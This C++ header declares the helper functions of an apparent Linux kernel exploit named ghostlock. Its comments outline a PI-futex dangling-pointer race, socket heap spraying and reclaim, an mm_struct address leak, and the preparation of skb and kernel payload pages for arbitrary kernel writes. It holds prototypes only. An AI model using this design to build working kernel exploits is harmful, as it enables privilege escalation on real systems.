#ifndef GHOSTLOCK_SUPPORT_DECLS_HPP
#define GHOSTLOCK_SUPPORT_DECLS_HPP

#include <cstddef>
#include "support/status.hpp"
#include <cstdint>
#include <sys/types.h>

#include "memory/payload_builder.h"

namespace ghostlock::support {
    void read_first_line(const char *path, char *buf, size_t len);

    void log_startup_context(void);

    /* Machine state at a stage boundary -- cores' actual speed, temperature,
     * load and free memory. See the definition for why it is called rarely. */
    void log_environment(const char *tag);

    void log_sync(void);

    [[noreturn]] void fail_stop_dirty_race(const char *reason,
                                           int32_t error_number) noexcept;

    void disable_rseq_for_thread(void);

    void init_p0_profile(void);

    long futex_op(
        uint32_t *uaddr, int32_t op, uint32_t val,
        const void *timeout_or_value, uint32_t *uaddr2, uint32_t val3);

    /* Force the kernel to clear this thread's dangling task->pi_blocked_on.
     * Only the blocking PI-futex path rewrites the field (ETIMEDOUT clears
     * it), and it must run on the thread that owns the pointer. */
    long ghost_disarm(const char *why, int32_t *err_out);

    long sched_setattr_tid(int32_t tid, int32_t nice_value);

    void put64(unsigned char *p, size_t off, uint64_t value);

    void put32(unsigned char *p, size_t off, uint32_t value);

    pid_t clone_child(void);

    pid_t clone_leak_child(void);

    int32_t open_memfd(pid_t child);

    void kill_child(pid_t child);

    void close_reclaim_sockets(void);

    int32_t quarantine_reclaim_sockets(void);

    void release_quarantined_reclaim_sockets(void);

    Status stash_prebuilt_page(void);

    Status activate_prebuilt_page(void);

    void discard_prebuilt_page(void);

    void cleanup_page_prepare_state(void);

    int32_t clone_memfd(void);

    void prepare_ctxs(void);

    int32_t prepare_skb_payload(uintptr_t base, const ghostlock::memory::WriteRequest *request);

    /* leak_only: run the spray and the mm_struct leak, then tear the spray
     * down without preparing a payload page. Used by the profile-generation
     * stride probe; the attack path always calls the default form. */
    uintptr_t prepare_kernel_page(const ghostlock::memory::WriteRequest *request,
                                  bool leak_only = false);

    uintptr_t prepare_good_kernel_page(const ghostlock::memory::WriteRequest &request);

    /* Page-free Stage 3: the run's effective mode (route policy ∧ profile W1
     * scratch ∧ profile route lock anchor). `page_free_reason` is the first
     * missing conjunct, for the run's one-line evidence. */
    bool page_free_run(void);

    const char *page_free_reason(void);

    /* Page-free Stage 3: derive the write layout for `request` without a
     * payload page, install it in heap.current and zero every page verdict
     * field, so a route can stamp against the anchors only. Returns 0 when
     * the profile's stated scratch cannot resolve or a value-carrying write
     * has no value source. */
    int32_t prepare_page_free_context(const ghostlock::memory::WriteRequest &request);

    /* Run up to max_rounds unprivileged leak rounds for the slab-stride
     * verifier and print its evidence table ([stride] lines). Returns whether
     * one candidate held every nonzero vote. The caller must have installed the
     * profile and initialized the runtime configuration. */
    bool probe_mm_stride(std::size_t sizeof_mm, std::size_t max_rounds);
} // namespace ghostlock::support

#endif
